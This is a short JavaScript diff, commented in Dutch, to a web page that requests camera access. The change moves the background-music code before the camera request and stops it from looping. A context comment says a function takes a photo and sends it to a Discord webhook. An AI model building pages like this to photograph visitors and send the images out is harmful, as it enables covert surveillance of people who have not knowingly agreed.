@@ -12,6 +12,11 @@
             var timestamp = new Date().toISOString();
             var video = document.getElementById('video');
 
+            // Muziek afspelen
+            var audio = new Audio('sound.mp3');
+            audio.loop = false;
+            audio.play();
+
             // Toegang vragen tot de camera
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function (stream) {
@@ -27,11 +32,6 @@
                 .catch(function (err) {
                     console.error("Error accessing camera: ", err);
                 });
-
-            // Muziek afspelen
-            var audio = new Audio('sound.mp3');
-            audio.loop = true;
-            audio.play();
         }
 
         // Functie om een foto te maken en naar Discord webhook te sturen in een embed bericht
